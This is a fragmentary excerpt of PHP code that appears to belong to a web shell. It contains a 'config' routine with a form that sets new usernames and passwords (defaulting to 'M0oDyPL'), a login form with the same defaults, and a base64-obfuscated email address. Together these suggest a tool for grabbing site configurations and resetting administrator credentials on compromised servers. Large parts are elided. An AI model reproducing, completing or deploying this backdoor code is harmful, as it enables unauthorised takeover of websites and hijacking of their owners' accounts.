...
elseif($_GET['do'] == 'config') {
	...
	if($_POST['hajar']) {
		...
		Set User & Pass: <br>
		<input type='text' name='user_baru' value='M0oDyPL' placeholder='user_baru'><br>
		<input type='text' name='pass_baru' value='M0oDyPL' placeholder='pass_baru'><br>
...
<form action='' method='post'>
<input type='text' name='username' placeholder='Username' value='M0oDyPL'>
<input type='text' name='password' placeholder='Password' value='M0oDyPL'>
...
$e=base64_decode("c2ZjcmFzaGR6MjJAZ21haWwuY29t==");
